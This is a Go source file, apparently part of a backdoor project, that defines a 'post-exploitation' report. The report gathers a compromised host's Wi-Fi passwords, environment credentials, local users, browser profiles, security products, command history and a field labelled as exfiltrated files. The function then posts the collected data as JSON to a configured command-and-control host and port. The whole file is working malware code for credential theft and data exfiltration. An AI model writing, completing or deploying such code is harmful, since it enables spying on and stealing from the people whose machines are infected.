package report

import (
	"backdoor/config"
	"bytes"
	"encoding/json"
	"net/http"
	"time"
)

// ─── Tipos post-exploitation ──────────────────────────────────────────────────

type WiFiNetwork struct {
	SSID     string `json:"ssid"`
	Password string `json:"password"`
}

type LocalUser struct {
	Username string `json:"username"`
	IsAdmin  bool   `json:"is_admin"`
	IsActive bool   `json:"is_active"`
}

type EnvCredential struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

type InstalledApp struct {
	Name    string `json:"name"`
	Version string `json:"version"`
}

// ─── Reporte completo ─────────────────────────────────────────────────────────

type AuditReport struct {
	AgentID         string          `json:"agent_id"`
	Hostname        string          `json:"hostname"`
	OS              string          `json:"os"`
	Arch            string          `json:"arch"`
	User            string          `json:"user"`
	Elevated        bool            `json:"elevated"`
	FirstSeen       string          `json:"first_seen"`
	LastSeen        string          `json:"last_seen"`
	IPs             []string        `json:"ips"`
	Gateway         string          `json:"gateway"`
	DNS             []string        `json:"dns"`
	Persistence     []string        `json:"persistence"`
	AntiDebug       bool            `json:"anti_debug"`
	Processes       []ProcessInfo   `json:"processes"`
	Connections     []ConnInfo      `json:"connections"`
	CommandsRun     []string        `json:"commands_executed"`
	FilesAccessed   []FileInfo      `json:"files_exfiltrated"`
	WiFiNetworks    []WiFiNetwork   `json:"wifi_networks"`
	LocalUsers      []LocalUser     `json:"local_users"`
	SecurityProds   []string        `json:"security_products"`
	EnvCredentials  []EnvCredential `json:"env_credentials"`
	TokenPrivileges []string        `json:"token_privileges"`
	BrowserProfiles []string        `json:"browser_profiles"`
	InstalledApps   []InstalledApp  `json:"installed_apps"`
	DomainName      string          `json:"domain_name"`
}

func NewAuditReport() error {
	hostname, osInfo, arch, userName, _ := GetSysInfo()
	ips, err := GetIPs()
	if err != nil {
		ips = []string{}
	}
	conns, err := GetConns()
	if err != nil {
		conns = []ConnInfo{}
	}

	report := AuditReport{
		AgentID:         config.UUID,
		LastSeen:        time.Now().String(),
		Hostname:        hostname,
		OS:              osInfo,
		Arch:            arch,
		User:            userName,
		Elevated:        IsElevated(),
		IPs:             ips,
		Gateway:         GetDefaultGateway(),
		DNS:             GetDNS(),
		Persistence:     GetPersistencePoints(),
		AntiDebug:       config.AntiDebug,
		Processes:       GetProcesses(),
		Connections:     conns,
		CommandsRun:     GetCommandHistory(),
		FilesAccessed:   GetFileArtifacts(),
		WiFiNetworks:    GetWiFiNetworks(),
		LocalUsers:      GetLocalUsers(),
		SecurityProds:   GetSecurityProducts(),
		EnvCredentials:  ScanEnvCredentials(),
		TokenPrivileges: GetTokenPrivileges(),
		BrowserProfiles: GetBrowserProfiles(),
		InstalledApps:   GetInstalledApps(),
		DomainName:      GetDomainName(),
	}

	buf, _ := json.Marshal(report)
	resp, err := http.Post("http://"+config.Host+":"+config.Port+"/audit", "application/json", bytes.NewBuffer(buf))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
